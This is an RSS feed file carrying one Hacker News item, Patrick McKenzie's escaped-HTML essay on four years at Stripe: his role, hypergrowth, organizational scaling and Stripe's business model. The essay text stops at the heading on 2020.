<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>What Working At Stripe Has Been Like</title>
<link>https://kalzumeus.com/2020/10/09/four-years-at-stripe/</link>
<guid isPermaLink="true" >https://kalzumeus.com/2020/10/09/four-years-at-stripe/</guid>
<description>&lt;p&gt;I joined &lt;a href=&quot;https://stripe.com&quot;&gt;Stripe&lt;/a&gt; four years ago to make starting an Internet business easier, mostly by work on &lt;a href=&quot;https://stripe.com/atlas&quot;&gt;Stripe Atlas&lt;/a&gt;. This has been a series of adjustments for me: to working as an employee, to experiencing hypergrowth, to being closer to the Silicon Valley culture, and to some of the challenges in balancing career and other commitments during my life stage and the global coronavirus pandemic of 2020.&lt;/p&gt;
&lt;p&gt;Perhaps some commentary will help other folks make decisions, so here it is. I’ve previously written about my experience &lt;a href=&quot;https://kalzumeus.com/2019/3/18/two-years-at-stripe/&quot;&gt;after two years&lt;/a&gt; and my &lt;a href=&quot;https://kalzumeus.com/2016/09/09/im-joining-stripe-to-work-on-atlas/&quot;&gt;thought process in joining Stripe&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;what-do-you-do-at-stripe&quot;&gt;What do you do at Stripe?&lt;/h2&gt;
&lt;p&gt;I’ve had a very fluid job at Stripe for much of my tenure, which has had pluses and minuses. It has allowed me to work on broad challenges throughout the company’s operations, but sometimes means less legibility internally and externally. That has started to matter more as we’ve scaled.&lt;/p&gt;
&lt;p&gt;When I was hired, there was a fiction for my business cards but the job rounded to “Do anything required to make Stripe Atlas successful.” I contributed on a part-time basis to things outside of Atlas. For about a year I was formally in the Marketing department while continuing to do a broad portfolio of things, many of which aren’t classically considered marketing.&lt;/p&gt;
&lt;p&gt;As of December or so, I’ll be joining a new cross-functional team with designers, publishers, and writers. We will run some of Stripes publishing properties (like Stripe Press and Increment), continue doing not-quite-software-product experiments to make the Internet more hospitable to starting and scaling businesses, and help to maintain and improve the developer experience and candidate perceptions of Stripe.&lt;/p&gt;
&lt;p&gt;My job within the group will remain a bit tough to pigeonhole. I’m not and haven’t been a manager at Stripe; I’m a senior IC&lt;sup id=&quot;fnref:ic&quot; role=&quot;doc-noteref&quot;/&gt;.&lt;/p&gt;
&lt;h2 id=&quot;no-really-what-do-you-actually-do-every-day&quot;&gt;No really, what do you actually &lt;em&gt;do&lt;/em&gt; every day?&lt;/h2&gt;
&lt;p&gt;I work from Tokyo and most colleagues close to me on projects are in San Francisco, Seattle, or remote in North American time zones. This means I get up early frequently and (thankfully decreasingly) sometimes go to bed late.&lt;/p&gt;
&lt;p&gt;A typical day for me is an hour of meetings starting at about 7 AM in Japan, an hour helping my kids get to school, another hour to two of meetings, and then focused work time which may include a meeting or two with someone in an APAC time zone in the afternoon. Due to the coronavirus situation, I’m presently working from home; prior to it, on most days I would work from the Tokyo office, commuting in after morning meetings.&lt;/p&gt;
&lt;p&gt;I wouldn’t call myself a paragon of work/life balance; I’m a recovering salaryman and used to run businesses which routinely paged me during core user hours when I was sound asleep. The nature of my work makes it hard to give a rigorous estimate of “how much I work.” My job and my main hobby overlap. I’m basically never not thinking about the Internet economy. My sleep schedule has ranged from atypical to disastrous, but that has been true for almost all of my adult life.&lt;/p&gt;
&lt;p&gt;My work falls into three buckets which are approximately equal weighted in importance and time spent:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Project work&lt;/strong&gt;: This is the core work for my assigned team. A typical smallish project would be getting a blog post written; a largish project would be assisting a Stripe product launch. My actual involvement work on the project generally involves planning, execution on particular bits of it (often involving writing directly public-facing artifacts and internal plans), and being a generalist happy to do anything required to ship.&lt;/p&gt;
&lt;p&gt;Back when I was working on Stripe Atlas, due to how that team operated I was more directly involved in product work. These days I’m generally brought in early during the ideation and customer discovery phases and late in the launch / go-to-market phase, but don’t frequently contribute directly to design or implementation of the products.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Consultative work&lt;/strong&gt;: I spend a lot of time on community work (including on HN and &lt;a href=&quot;https://twitter.com/patio11&quot;&gt;Twitter&lt;/a&gt;), work directly with individual users, and advocate for some user personas internally.&lt;/p&gt;
&lt;p&gt;I have been described as an evangelist, and that makes me feel a little weird, but part of the job is turning personal karma into corporate karma. Stripe makes products which are much more central to our customers’ businesses than most software. We have to demonstrate good taste and probity, and we have to do so prior to winning the customer’s business. I love talking to founders and acting as an entrepreneurial commentator, and would (and did, and do) do it for free, but part of the reason I can do from a work laptop is that, at the margin, it makes it more likely that you will build your next business on Stripe.&lt;/p&gt;
&lt;p&gt;In addition to this, every time I convince a Stripe customer to &lt;a href=&quot;https://stripe.com/atlas/guides/saas-pricing&quot;&gt;raise their prices&lt;/a&gt; or otherwise improve their business, we benefit directly. “I am employed to tell people to Charge More&lt;sup&gt;TM&lt;/sup&gt;” sounds like a self-deprecating joke, but you could imagine me attaching a spreadsheet to performance reviews. One sheet would be my best guess of how many software founders would listen to my advice, one would calculate the relative distribution of $100k, $1M, $10M, and $100M annual revenues among software companies, and one would include observed uplift after implementation of advice.&lt;/p&gt;
&lt;p&gt;My consulting business used to be centered on turning $20 million a year software businesses into $22 million a year software businesses. A quick perusal of our pricing page will suggest why we can afford to give my advice away for free.&lt;/p&gt;
&lt;p&gt;Sometimes this involves scalable writing such as the Stripe Atlas guides. Sometimes I work with a single founder to get their B round accomplished.&lt;/p&gt;
&lt;p&gt;People sometimes ask whether we’ll &lt;a href=&quot;https://twitter.com/patrickc/status/1308777619454795782&quot;&gt;retain our startup-focused soul while increasingly serving enterprises&lt;/a&gt;. A portion of my job is helping folks communicate that we’re serious, reliable infrastructure for the largest participants in the global economy &lt;em&gt;while also&lt;/em&gt; keenly appreciating that the user might be on a small team trying to sell &lt;a href=&quot;https://web.archive.org/web/20151001000000*/discuss.joelonsoftware.com/default.asp?biz.5.359246.16&quot;&gt;bingo cards&lt;/a&gt; or &lt;a href=&quot;https://www.airbnb.com/obamaos&quot;&gt;politically-themed breakfast cereal&lt;/a&gt;. This sometimes means intervening if it looks like we’re not living up to our expectations. We care about supporting upstarts because that increases economic opportunity worldwide, which is a worthy mission to have. Also, directly relevant to the business, you never know what people are going to go on to accomplish.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Non-core projects&lt;/strong&gt;: Every few quarters, I rotate to a new team to spin up some new experiments and see if they’re worth doing long-term. If they are, I try to set an appropriate team up to own them.&lt;/p&gt;
&lt;p&gt;Two notable successes:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;YC application review&lt;/strong&gt;, where we solicit applications before founders send them to YC, and help the founders tell their story better (and sometimes provide direct business advice). That started with me &lt;a href=&quot;https://twitter.com/patio11/status/779402010315468800&quot;&gt;solo reviewing every application&lt;/a&gt;. We built it into a repeatable process with 100+ Stripes involved every six months.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;Remote Coffee Chat series&lt;/strong&gt;, where we experimented with radically decreasing the barriers to actually meeting future coworkers by doing Zoom meetings with a panel of six Stripes and anyone who wanted to hear us talk shop. Coworkers are the best possible advertisement (and one core benefit) for working at a company, so just exposing potential candidates to people talking about &lt;em&gt;just actually doing work&lt;/em&gt; has led to great opportunities. We have &lt;a href=&quot;https://stripe.com/blog/remote-hub-one-year&quot;&gt;hundreds&lt;/a&gt; of remote Stripes and a surprising number are here because they decided to drop by to a coffee.&lt;/p&gt;
&lt;p&gt;This is a refinement of a previous process, where I just took requests from anywhere at Stripe to pitch in. That became acutely unsustainable, because…&lt;/p&gt;
&lt;h2 id=&quot;what-has-changed-over-four-years&quot;&gt;What has changed over four years?&lt;/h2&gt;
&lt;p&gt;Stripe has experienced hypergrowth over the nine years where it has been publicly available, and I’ve seen four years of that personally. You’ll forgive me for not putting a number on it.&lt;/p&gt;
&lt;p&gt;Read “hypergrowth” as “sustained, geometrically compounding growth in most metrics of interest, persisting for years at a time, at growth rates which one does not see sustained for years in almost any field of human endeavor except&lt;sup id=&quot;fnref:microsoft&quot; role=&quot;doc-noteref&quot;/&gt; at hypergrowth companies.”&lt;/p&gt;
&lt;p&gt;From this simple observation about growth rates you can predict many statements about the world, and those statements will sound outlandish. Many of them are true, which might not make them less outlandish.&lt;/p&gt;
&lt;p&gt;Here’s one: I started in September 2016. At that point, Stripe Payments had publicly been available for 5 years. Stripe is, qualitatively and quantitatively, about as different counting from my start date to today as it was counting from launch to my start date. The midpoint isn’t an &lt;em&gt;arithmetic&lt;/em&gt; mean, it is a &lt;em&gt;geometric&lt;/em&gt; mean; huge changes happened over short intervals.&lt;/p&gt;
&lt;p&gt;What does that mean &lt;em&gt;concretely&lt;/em&gt;? Well, I was employee #650 or so. A common worry of folks joining around the time I joined was whether there was anything left to do. Have we solved all the challenges we’re going to solve? Have we built all the things we’re going to build? Has all the fun work already been done?&lt;/p&gt;
&lt;p&gt;This was a serious worry in 2016. It is laughable now. We have almost 3,000 employees and it feels like too few to do all the work. We have solidified a lot of our operations, security posture, resiliency, etc, and it still feels like we have huge opportunities for improvement.&lt;/p&gt;
&lt;p&gt;We keep shipping things, including both incremental improvements to the N dimensional capabilities matrix that is Payments (e.g. &lt;a href=&quot;https://stripe.com/blog/jcb-expansion&quot;&gt;expanding JCB acceptance&lt;/a&gt;) and fully new products like e.g. &lt;a href=&quot;https://stripe.com/corporate-card&quot;&gt;Corporate Card&lt;/a&gt;. One thing coming down the pipe is more exciting to me personally than anything since Stripe Atlas.&lt;/p&gt;
&lt;p&gt;This has required a lot of work, including metawork on the organization itself. This has been &lt;em&gt;the defining&lt;/em&gt; challenge of hypergrowth for me, and it &lt;em&gt;never stops&lt;/em&gt;: if a company is hypothetically growing at 2X per year, then on the day you join half of your coworkers will have less than a year of experience. A year later, half of your coworkers will have less than a year of experience. A year later…&lt;/p&gt;
&lt;p&gt;This means that, while working on the project that should land in mid-October and also working on infrastructure to keep the lights on, you are also working on making sure your organization (or sub-org, or team, etc) can quickly spin up people who recently joined and get ready for the next phase of organizational scaling challenges.&lt;/p&gt;
&lt;p&gt;When I interviewed at Stripe the Marketing Department came to meet me. Her name was &lt;a href=&quot;https://twitter.com/krithix&quot;&gt;Krithika&lt;/a&gt;. We now have about 60 people in Marketing. Every milestone is simultaneously project work, attempting to teach newer members the company voice and tone, letting more experienced team members stretch their wings a bit in their careers, and updating the list of things that are on the cusp of breaking.&lt;/p&gt;
&lt;p&gt;And break they do! We got an incredibly long way on having a very small group of Stripes care passionately about e.g. product launches, but “the entire team working on this page could split a pizza” doesn’t scale to e.g. needing to localize it for 40 countries, give regulators in many of those countries a heads-up, get formal approval for quotes from enterprises with A Process For That where previously we could have just texted a startup founder, etc.&lt;/p&gt;
&lt;p&gt;And so the way we work changes.&lt;/p&gt;
&lt;h2 id=&quot;organizational-and-career-growth-corresponding&quot;&gt;Organizational and career growth corresponding&lt;/h2&gt;
&lt;p&gt;I used to read &lt;a href=&quot;https://firstround.com/review/hypergrowth-and-the-law-of-startup-physics/&quot;&gt;essays&lt;/a&gt; about how some people don’t “grow with the company” they founded and leave it to start something again, or how some people have a preferred stage of company. These never made intuitive sense until seeing much more range in four years than my career had exposed me to in the 15 prior.&lt;/p&gt;
&lt;p&gt;As Stripe has matured around some of these challenges, the type of contribution I do most often has changed. If I were doing exactly what I did on day 100, I’d probably be useful at the margin but underperforming my desired contribution to Stripe and the Internet at large.&lt;/p&gt;
&lt;p&gt;When I was on Stripe Atlas, a small, focused team with many high-horsepower generalists who largely didn’t have a huge amount of entrepreneurial experience, part of my job was bringing skills and connections and part was just standing up portions of our offering by sheer force. We wanted helpful advice for founders and didn’t have it; I locked myself in a room for a month and wrote a 30,000 word guide plus the ERB&lt;sup id=&quot;fnref:erb&quot; role=&quot;doc-noteref&quot;/&gt; to put it on the Internet. We wanted to inculcate an Atlas community; I installed Discourse, wrote our SSO code for it, sent out invites, and commented on every thread for months.&lt;/p&gt;
&lt;p&gt;These days, while I still do have occasionally grindy just-do-all-the-things sprints, a lot of my value to Stripe is understanding &lt;em&gt;Stripe&lt;/em&gt;. As an organization gets larger, an increasing portion of its activities turn inward.&lt;/p&gt;
&lt;p&gt;There is a line in Hollywood set design: “Make sure your budget gets on screen.” In startups, you want your efforts to be directly customer-visible. A well-operated early stage startup should spend basically no time on things which aren’t either product or talking to customers. Productive work is, by definition, “on screen” to users. You minimize (and regret) nuisances like incorporation, setting up payroll, and the gigantic productivity tarpit that is fundraising.&lt;/p&gt;
&lt;p&gt;Stripe is still a &lt;em&gt;relatively small&lt;/em&gt; company. The high school I attended was larger; AppAmaGooBookSoft have individual products with more engineers than our company has people total. But even at our scale, a large portion of all effort expended is “off screen.” It is interviewing candidates, writing performance reviews for teammates so that they have a career path, teaching new hires how to be effective, contributing to company planning exercises, running retrospectives on what happened such that the Japan team learned of a product launch when untranslated English appeared on an important page, etc.&lt;/p&gt;
&lt;p&gt;When I ran my own company, I looked at BigCo and wondered “What is it they &lt;em&gt;do&lt;/em&gt; all day?” I still think there are pretty vast differences in aggregate productivity per employee, and I think that is fairly obvious to anyone who takes software seriously, but I have much more appreciation for how much effort goes into just keeping a complex organization moving.&lt;/p&gt;
&lt;p&gt;There exists a &lt;a href=&quot;https://www.amazon.com/Bullshit-Jobs-Theory-David-Graeber/dp/150114331X&quot;&gt;theory&lt;/a&gt; that much of the work involved in keeping complex organizations running either doesn’t create or actively destroys value. I think this theory is &lt;em&gt;heavily overendorsed&lt;/em&gt;. There is value created off screen, too, but if your relationship to companies is as a user, you will not perceive it and therefore underestimate it.&lt;/p&gt;
&lt;p&gt;HR departments don’t exist to fill seats on a headcount plan; HR departments exist because as you scale you will &lt;em&gt;inevitably hit predictable challenges&lt;/em&gt; and the simplest solution to them, well-trodden by many companies before you and with minimal execution risk relative to alternatives, is to have a HR department. You can’t continue shipping software to users if your intermediate developers leave because they see no career path. You won’t continue talking to users if your sales reps repeatedly do not actually receive the promised amount of money on the right day, or if their local government is dissatisfied about withholdings. These don’t feel like challenges when you have three people in a company but get a bit more acute when you have 3,000.&lt;/p&gt;
&lt;p&gt;(In a way, every scaling startup is an experiment in empirical microeconomics research on “What parts of the typical corporate form are necessary and which are pageantry which we only keep around due to anchoring, the sunk cost fallacy, and tradition?” Every time a startup bites the bullet and hires a VP of Sales, a lifecycle email copywriter, a retirements benefits administrator, or a cook, count that as a published result saying “Yep, we found this to be necessary.”)&lt;/p&gt;
&lt;p&gt;As Stripe scales, I find the forms of my contributions changing. I sustained &lt;a href=&quot;https://kalzumeus.com/wc/&quot;&gt;250,000 words&lt;/a&gt; written a year for many years while running my software companies. I feel like I still write as much as ever, but increasingly off of the public Internet. They might instead land on e.g. our Japan strategy for 2020, feedback on positioning for a new product launch, helping a colleague think through their career goals 2 years out, etc.&lt;/p&gt;
&lt;p&gt;I still do customer-visible work. One project was a customer-facing email series which, according to our A/B test, added probably $THIS_NUMBER_HAS_A_LOT_OF_DIGITS of enterprise value. Scale has its advantages. Those emails weren’t subjectively the best writing of my career; it was a meat-and-potatoes drip campaign. Most of the challenge was getting us organizationally comfortable with the notion of doing it. The important result wasn’t either the words or the observed uplift; it was producing organizational certainty that “Yep, turns out every B2B SaaS company has a lifecycle email campaign &lt;em&gt;for a reason&lt;/em&gt; and we definitely should, too.” That’s something that I believed on day one and which many stakeholders agreed with, but there was an art to getting &lt;em&gt;the organization&lt;/em&gt; to successfully ship it.&lt;/p&gt;
&lt;p&gt;“Stakeholder” always felt like a funny corporate word for me, but it is a useful one. A perennial problem a few years ago was that we were, generally, rubbish at doing stakeholder identification in advance. This meant that projects were frequently organized by informal social networks over Slack and email. That has some scaling challenges. We’re better at it these days, though that is a major work in progress. A recent ship had sixty identified stakeholders on it; that number simultaneously strikes my founder brain as absurdly high and my commentator brain as “Wow, that’s lower than I would have expected for novel financial infrastructure, by more than an order of magnitude.”&lt;/p&gt;
&lt;h2 id=&quot;the-global-startup-and-tech-communit-y-ies&quot;&gt;The global startup and tech communit(-y/-ies)&lt;/h2&gt;
&lt;p&gt;I’ve joked for years that I orbit Silicon Valley at a distance of approximately an ocean, largely due to spending a lot of time on HN. I think I may have to deprecate that joke.&lt;/p&gt;
&lt;p&gt;Silicon Valley &lt;em&gt;was&lt;/em&gt; a place. It &lt;em&gt;has become&lt;/em&gt; a metonymy for a community of practice. You can find outposts of Silicon Valley in Tokyo cafes, in WeWorks in Bangalore, and on the coast of Cape Town.&lt;/p&gt;
&lt;p&gt;This predates the 2020 coronavirus-induced boom in remote working, but in many ways that is forcing acknowledgment of an existing trend. The argument for continued hyper-concentration of the tech industry in a particular location had observable fact going in its favor, and now observable fact is that many of the nodes central to the network are Zooming in from elsewhere.&lt;/p&gt;
&lt;p&gt;The Schelling point was sustainable when the talent went where the money was and the money went where the talent was, but now that everyone knows that a tech company can thrive over Zoom meetings, minutes of commute time from Sand Hill Road should no longer be a dominant driver of access to capital.&lt;/p&gt;
&lt;p&gt;This genie feels unlikely to go back in the bottle.&lt;/p&gt;
&lt;p&gt;Much of my job is being an accelerant for this change. It involves democratizing access to the folkways of Silicon Valley, both via scalably publishing about them (e.g. writing this &lt;a href=&quot;https://stripe.com/atlas/guides/pitching&quot;&gt;guide about pitching a startup&lt;/a&gt;) and via less public conversations. I also have spent many cycles working on Stripe’s ongoing expansion, including our acceleration of remote work and helping to make a heavily international organization a cohesive culture.&lt;/p&gt;
&lt;p&gt;Working at Stripe has caused an interesting change in my relationship to the Silicon Valley ecosystem. One way is that the domain name sometimes opens doors that the username did not. (That doesn’t feel great to me, to be honest, but is a useful observation about life, particularly to folks who are early in their careers.) I know a lot more venture capitalists, executives, etc than I did a few years ago, and am treated as a more serious professional than I was despite no obvious corresponding change in skill in the intervening time&lt;sup id=&quot;fnref:meritocracy&quot; role=&quot;doc-noteref&quot;/&gt;.&lt;/p&gt;
&lt;p&gt;It is my perception that I will probably keep these newer advantages in the future; I wish I had understood how this part of the ecosystem worked 15 years ago. (I am aware that I am saying this from the perspective of someone who had a reasonably deep network when I joined; it turns out that there are &lt;em&gt;levels&lt;/em&gt; here.)&lt;/p&gt;
&lt;p&gt;Working at Stripe affords me a lot more leverage to help software people than I had previously. The most direct way is by improving our products and services, and as time goes to infinity I assume that will be Stripe’s largest impact. At the margins, though, there is some benefit to being able to play a social capital marketmaker. You would benefit from meeting this investor; they have expertise in your core challenge. You should take a meeting with this startup; they’re incredibly on-thesis for you. We should reconsider a decision on this compliance edge case; it negatively affects a single startup.&lt;/p&gt;
&lt;p&gt;(I can’t provide much color commentary on that, for the obvious reasons. I will say that part of the work is doing the work, and part of the work is teaching the organization how to do the work. A major purpose of me spending an “economically irrational” amount of time working to improve one startup’s experience is to help maintain the organizational culture such that our newest employee understands that overwhelming support for startups is the default expectation.)&lt;/p&gt;
&lt;p&gt;Speaking of marketmaking, I’ll observe that I seem to be drawn to finance as a source of analogies and models of the world more than previously. Partly that is due to having my baseline business model reconfigured from a recurring revenue SaaS company to Stripe’s somewhat more complicated one (see below). Partly it is due to talking to many more investors and financially-oriented professionals than I did previously. I cannot say this enough: pick your peer group wisely because you’re giving them write access to both your conscious thoughts and your entire worldview.&lt;/p&gt;
&lt;p&gt;I mentioned two years ago that the Stripe Atlas team was the strongest one I had ever worked on. I continue to like my peer group at Stripe and the folks I interact with outside our Slack. I’ll note that a bittersweet part of this is that a combination of Silicon Valley math and having ambitious friends means that many of my close peers moved on to new adventures over the course of four years. Frequently that is for founding a company; sometimes it is for taking a career upgrade elsewhere. The salaryman part of my brain has despaired about the number of “Here’s my contact information if you ever need it” emails that I have to write, and the entrepreneur part of my brain feels the same temptation constantly.&lt;/p&gt;
&lt;p&gt;(We are given a survey every six months to measure employee engagement. One of the questions is “Do you ever think about taking a job elsewhere?” and I always answer it truthfully and then add the freeform note “I apologize because I know this answer will be scored negatively but if I weren’t constantly thinking of starting a company I would be rubbish at this job.” It’s an amusing superposition: I feel like I’ve done the best work of my career to date but that if it ever becomes the best work looking forward something went deeply off the rails.)&lt;/p&gt;
&lt;h2 id=&quot;being-an-employee-versus-being-an-entrepreneur&quot;&gt;Being an employee versus being an entrepreneur&lt;/h2&gt;
&lt;p&gt;There are many differences in being an employee versus running your own business. Most are covered adequately elsewhere.&lt;/p&gt;
&lt;p&gt;This was a surprise to me: I had never deeply considered career goals prior to having a manager who had “Make sure to talk to patio11 about career goals this quarter” on their todos. It was always “Eh, running a company now, will probably run other ones in the future, what is a career anyhow, the priority for the business this week is…” for the last decade.&lt;/p&gt;
&lt;p&gt;On having space to reflect on this, and being forced by the Stripe written culture to actually put the words to paper, I firmed up my understandings of what I want out of my career, what I hope to accomplish through the (fairly large) chunk of life that is working, how that relates to my other values, etc.&lt;/p&gt;
&lt;p&gt;I’ll spare you the whole writeup, but my career success metric is making a large improvement in the lives of a large number of software people. I encourage anyone who isn’t already planning on a 45 year time scale to try taking a stab at this and reviewing the plan every year; the weeks are long but the years fly by sometimes.&lt;/p&gt;
&lt;p&gt;At present I’m at Stripe because I think it is probably the best option available in working against those long-term goals. 15 years down; 30+ to go; still early innings.&lt;/p&gt;
&lt;p&gt;I’ll note that working in a growing startup will give you many, many ideas for companies to start. Basically every internal tool at a company capable of putting good engineers on a “boring” problem should be used across the economy at companies that can’t get that caliber of engineer on that sort of problem. Working here has also helped me better calibrate my understanding of how companies in strange countries like the U.S. actually work; I would certainly do some of our Starfighter experience differently having seen how a recruiting team works up close, for example.&lt;/p&gt;
&lt;h2 id=&quot;what-stripe-does-differently&quot;&gt;What Stripe does differently&lt;/h2&gt;
&lt;p&gt;I thought when I joined that I had a fairly well-developed mental model of Stripe as a user. Here’s where I’ve refined that model over time:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I have persistently underrated the usefulness of ambition and the amount of it that Stripe has.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I have been a long-time skeptic of Silicon Valley’s “changing the world by $INSERT_HERE” memeplex and preferred running businesses which were small patches to capitalism. I retain a great love for small businesses, and have no deep regrets, but I’ve gained a strong appreciation for having an expansive view of one’s future possible impact and on moving quickly to get there. Considered in hindsight, I think my businesses would have been more successful and I would have been more fulfilled had I hit harder, bigger problems faster rather than tackling ones I was more sure that I could take on.&lt;/p&gt;
&lt;p&gt;There exists a class of errors that I think English lacks an adequate name for: one which you know about, believe yourself to have adjusted for, and are still underadjusted for. I &lt;a href=&quot;https://twitter.com/patio11/status/342318580555190272&quot;&gt;thought&lt;/a&gt; I had an adequate mental model for how ambitious Stripe was rather early in its life. I believe that tweet to be underadjusted in scoping the ambition. I believe I am likely, here in 2020, still underappreciating its true scope of ambition.&lt;/p&gt;
&lt;p&gt;That probably sounds crazy. Again: my worry is not that I am crazy, it is that I am not crazy enough. I think I understand the underlying drivers of the hypergrowth graph sufficiently to understand what the sources of risk to it are. While those sources of risk are a constant, daily struggle, the market opportunity clearly does not have an asymptote close to where we are.&lt;/p&gt;
&lt;p&gt;I also have the benefit of looking back at Stripe’s extensive internal library, including the contemporaneous thoughts of many internal and external smart people at various points along the curve, and almost all of them substantially underpredicted both what would be achieved and what concrete instantiations the big ambition would take on over time.&lt;/p&gt;
&lt;p&gt;I know this sort of thinking gets widely mocked in online watering holes, including by myself many years ago, and all I can say is “Pick a peer group where ambition in the service of humanity is seen as positive and where actual progress is seen as achievable.” A huge portion of the value creation of Silicon Valley is through &lt;a href=&quot;https://marginalrevolution.com/marginalrevolution/2018/10/high-return-activity-raising-others-aspirations.html&quot;&gt;directly intervening on the ambition of impressionable people&lt;/a&gt;. I suspect one reason it echoes in culture outside of the technology industry is that this ambition effect is repeatable elsewhere. (And I suspect that one reason Silicon Valley draws such criticism is because this ambition effect is &lt;em&gt;demonstrably&lt;/em&gt; repeatable elsewhere. Examples left as an exercise to the reader.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Set one’s operating cadence to ‘run.’&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Organizations have a lot of difficulty operating at a cadence which is unlikely their default one, and that cadence tends to get slower over time as the organization’s energy gets taxed to support the organization itself. People also seem to have a set operating cadence, though theirs is more context-dependent; I’ve noticed wild swings in mine over my various jobs, mostly in conforming to local norms.&lt;/p&gt;
&lt;p&gt;Relentless execution is something of a cliche, but it is a cliche for a reason. Organizations that need to hire a Head of X to start Xing will necessarily pay a multi-month cost to start Xing; you can get a lot done in months. Many organizations will have a culture which says “Why do X in the interim when we don’t know the best practices and will inevitably throw it away?”; they will lose out on months of progress.&lt;/p&gt;
&lt;p&gt;The returns to pushing your cadence to faster are &lt;em&gt;everywhere&lt;/em&gt; and they &lt;em&gt;compound continuously&lt;/em&gt;, for years. Don’t send the email tomorrow. Don’t default to scheduling the meeting for next week. Don’t delay a worthy sprint until after the next quarterly planning exercise. Design control and decisionmaking structures to bias heavily in favor of preserving operating cadence.&lt;/p&gt;
&lt;p&gt;I don’t think Stripe is uniformly &lt;em&gt;fast&lt;/em&gt;. I think teams at Stripe are just &lt;em&gt;faster than&lt;/em&gt; most companies, blocked a bit less by peer teams, constrained a tiny bit less by internal tools, etc etc. There are particular projects which have been agonizingly long to ship; literally years after I would have hoped them done. But &lt;em&gt;across the portfolio&lt;/em&gt;, with now hundreds of teams working, we just &lt;em&gt;get more done&lt;/em&gt; than we “should” be able to.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;stupendous&lt;/em&gt; portion of that advantage is just consistently choosing to get more done. That sounds vacuous but hasn’t been in my experience. I have seen truly silly improvements occasioned by someone just consistently asking in meetings “Could we do that faster? What is the minimum increment required to ship? Could &lt;em&gt;that&lt;/em&gt; be done faster?” It’s the Charge More of management strategy; the upside is so dramatic, the cost so low, and the hit rate so high that you should just invoke it ritualistically.&lt;/p&gt;
&lt;p&gt;Most organizations operate at nowhere near the frontier of their capabilities. That is a choice, and strikes me as a &lt;em&gt;valid&lt;/em&gt;&lt;sup id=&quot;fnref:dignity&quot; role=&quot;doc-noteref&quot;/&gt; choice, but you can choose to move closer to the frontier, too.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Stripe has a much better economic model than most software companies.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Without spilling too much secret sauce:&lt;/p&gt;
&lt;p&gt;B2C software companies’ success scales with the count of their users. Growth in users is their primary lever in growing the business, which you can further decompose into acquisition, conversion, retention, etc. To a first approximation, no metric except those impacting growth matters. Software people use a lot of B2C software and their intuitions of the software business &lt;strong&gt;are overly informed&lt;/strong&gt; by this fact.&lt;/p&gt;
&lt;p&gt;B2B software companies’ success scales with both the count of their users &lt;em&gt;and those users’ success&lt;/em&gt;, because their pricing model will generally (unlike most B2C companies) capture a portion of the customer’s upside. They have the same incentives in growth that B2C companies do, but they have an additional lever: making the user more successful directly incrementally helps them. Additionally, &lt;em&gt;they participate in underlying growth of users&lt;/em&gt;, similar to an equity holder.&lt;/p&gt;
&lt;p&gt;A B2B business selling to healthcare providers in the United States includes an embedded synthetic call option on U.S. healthcare. Finance-to-geek translation: “If you sell to doctors you prefer futures in which more money goes to doctors. Those are much better futures for you than futures with less money going to doctors. However, even should you find yourself in a future with less money going to doctors, you will probably still have doctors to sell to, so it is difficult to imagine that future being much worse than today, given that you have only sold to a tiny percentage of all doctors so far.”&lt;/p&gt;
&lt;p&gt;My view on Stripe’s business prior to joining was “Stripe is &lt;em&gt;basically&lt;/em&gt; a B2B SaaS company with extremely reliable capture of upside when users succeed.” I believe that &lt;em&gt;substantially underappreciates&lt;/em&gt; the actual business. Large portions of Stripe’s business add another loop on top of the B2B SaaS loop, where Stripe is effectively indexing on its ability to grow the count and success of customers &lt;em&gt;who are themselves&lt;/em&gt; structurally equivalent&lt;sup id=&quot;fnref:saasy&quot; role=&quot;doc-noteref&quot;/&gt; to B2B SaaS companies.&lt;/p&gt;
&lt;p&gt;Combine this model and what a former colleague &lt;a href=&quot;https://twitter.com/mmcgrana/status/1260250538299408387&quot;&gt;dubbed&lt;/a&gt; Patio11’s Law (“The software economy is larger than you think, even after taking into account Patio11’s Law”) and you have my biggest surprise since joining Stripe.&lt;/p&gt;
&lt;p&gt;I believe that Stripe likely has another trick to play, which plausibly includes a loop on top of this one, where Stripe will perhaps index on the number and success of companies which index on the number and success of their customers, where those customers are structurally equivalent to B2B SaaS companies, who index on the number and success of their customers.&lt;/p&gt;
&lt;p&gt;As for the specifics of that, well, we’ll see what the next few years look like.&lt;/p&gt;
&lt;h2 id=&quot;2020-has-been-a-tough-year&quot;&gt;2020 has been a tough year&lt;/h2&gt;
